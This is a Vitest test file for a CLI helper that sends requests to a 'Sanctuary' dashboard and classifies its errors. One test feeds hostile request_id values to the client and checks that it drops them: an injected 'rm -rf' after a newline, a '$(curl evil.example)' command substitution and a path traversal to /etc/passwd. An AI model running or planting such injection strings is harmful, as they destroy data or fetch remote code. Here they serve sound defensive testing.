import { afterEach, describe, expect, it, vi } from "vitest";

import {
  dashboardRequest,
  DashboardRequestError,
} from "../../src/cli/dashboard-request.js";

function jsonResponse(
  status: number,
  body: unknown,
): Pick<Response, "ok" | "status" | "json"> {
  return {
    ok: status >= 200 && status < 300,
    status,
    json: async () => body,
  };
}

describe("dashboardRequest", () => {
  const originalDashboardUrl = process.env.SANCTUARY_DASHBOARD_URL;
  const originalDashboardToken = process.env.SANCTUARY_DASHBOARD_AUTH_TOKEN;

  afterEach(() => {
    vi.unstubAllGlobals();
    if (originalDashboardUrl === undefined) {
      delete process.env.SANCTUARY_DASHBOARD_URL;
    } else {
      process.env.SANCTUARY_DASHBOARD_URL = originalDashboardUrl;
    }
    if (originalDashboardToken === undefined) {
      delete process.env.SANCTUARY_DASHBOARD_AUTH_TOKEN;
    } else {
      process.env.SANCTUARY_DASHBOARD_AUTH_TOKEN = originalDashboardToken;
    }
  });

  it("sends JSON requests to the configured dashboard with auth", async () => {
    process.env.SANCTUARY_DASHBOARD_AUTH_TOKEN = "token-123";
    const fetchMock = vi
      .fn<typeof fetch>()
      .mockResolvedValue(jsonResponse(200, { ok: true, value: 42 }) as Response);
    vi.stubGlobal("fetch", fetchMock);

    const body = await dashboardRequest(
      "/api/task",
      {
        method: "POST",
        headers: { "X-Test": "kept" },
        body: JSON.stringify({ name: "demo" }),
      },
      { dashboardUrl: "http://127.0.0.1:4500/" },
    );

    expect(body).toEqual({ ok: true, value: 42 });
    expect(fetchMock).toHaveBeenCalledWith(
      "http://127.0.0.1:4500/api/task",
      expect.objectContaining({ method: "POST" }),
    );
    const headers = fetchMock.mock.calls[0]?.[1]?.headers as Headers;
    expect(headers.get("Accept")).toBe("application/json");
    expect(headers.get("Content-Type")).toBe("application/json");
    expect(headers.get("Authorization")).toBe("Bearer token-123");
    expect(headers.get("X-Test")).toBe("kept");
  });

  it("uses the environment dashboard URL when no context URL is provided", async () => {
    process.env.SANCTUARY_DASHBOARD_URL = "http://dashboard.local:7777/";
    delete process.env.SANCTUARY_DASHBOARD_AUTH_TOKEN;
    const fetchMock = vi
      .fn<typeof fetch>()
      .mockResolvedValue(jsonResponse(200, { ok: true }) as Response);
    vi.stubGlobal("fetch", fetchMock);

    await dashboardRequest("/api/inbox");

    expect(fetchMock.mock.calls[0]?.[0]).toBe("http://dashboard.local:7777/api/inbox");
    const headers = fetchMock.mock.calls[0]?.[1]?.headers as Headers;
    expect(headers.get("Authorization")).toBeNull();
    expect(headers.get("Content-Type")).toBeNull();
  });

  it("classifies dashboard HTTP failures with endpoint-specific hints", async () => {
    const fetchMock = vi
      .fn<typeof fetch>()
      .mockResolvedValue(
        jsonResponse(404, { ok: false, detail: "missing route" }) as Response,
      );
    vi.stubGlobal("fetch", fetchMock);

    await expect(dashboardRequest("/api/missing")).rejects.toThrow(
      "endpoint not implemented in this build (HTTP 404): missing route. Hint: verify the dashboard exposes /api/missing, or upgrade/restart Sanctuary dashboard.",
    );
  });

  // The FIRST link in the federation adopt diagnosability chain: an endpoint
  // that refuses to say WHICH check failed hands back a correlation id instead,
  // and this is where that id enters the process.
  it("extracts a server correlation id from a denial body", async () => {
    vi.stubGlobal(
      "fetch",
      vi.fn<typeof fetch>().mockResolvedValue(
        jsonResponse(403, {
          error: "forbidden",
          request_id: "3f2504e0-4f89-41d3-9a0c-0305e82c3301",
        }) as Response,
      ),
    );

    const err = await dashboardRequest("/v1/federation/rotate/reissue-node-cert").then(
      () => null,
      (cause: unknown) => cause,
    );
    expect(err).toBeInstanceOf(DashboardRequestError);
    expect((err as DashboardRequestError).requestId).toBe(
      "3f2504e0-4f89-41d3-9a0c-0305e82c3301",
    );
  });

  it("refuses a correlation id that is not literally a UUID", async () => {
    // This value arrives from a host the client has NOT authenticated (the
    // reissue route is pre-session) and is later displayed inside a command the
    // operator is invited to run. Anything but a UUID is DROPPED at the door
    // rather than escaped at each display site.
    for (const hostile of [
      "3f2504e0-4f89-41d3-9a0c-0305e82c3301\nrm -rf ~/.sanctuary",
      "$(curl evil.example)",
      "../../etc/passwd",
      "x".repeat(10_000),
      12345,
      { toString: () => "3f2504e0-4f89-41d3-9a0c-0305e82c3301" },
    ]) {
      vi.stubGlobal(
        "fetch",
        vi.fn<typeof fetch>().mockResolvedValue(
          jsonResponse(403, { error: "forbidden", request_id: hostile }) as Response,
        ),
      );
      const err = (await dashboardRequest("/v1/federation/rotate/reissue-node-cert").then(
        () => null,
        (cause: unknown) => cause,
      )) as DashboardRequestError;
      expect(err.requestId).toBeUndefined();
    }
  });

  it("leaves requestId undefined for endpoints that mint none", async () => {
    vi.stubGlobal(
      "fetch",
      vi
        .fn<typeof fetch>()
        .mockResolvedValue(jsonResponse(403, { error: "forbidden" }) as Response),
    );
    const err = (await dashboardRequest("/api/task").then(
      () => null,
      (cause: unknown) => cause,
    )) as DashboardRequestError;
    expect(err.requestId).toBeUndefined();
  });

  it("wraps network failures with setup guidance and nested cause detail", async () => {
    const fetchMock = vi.fn<typeof fetch>().mockRejectedValue(
      new Error("fetch failed", { cause: new Error("ECONNREFUSED") }),
    );
    vi.stubGlobal("fetch", fetchMock);

    await expect(dashboardRequest("/api/task")).rejects.toThrow(
      "network/connection failure: fetch failed; cause: ECONNREFUSED. Hint: start the Sanctuary dashboard, verify --fortress runtime, or set SANCTUARY_DASHBOARD_URL to a reachable endpoint.",
    );
  });
});
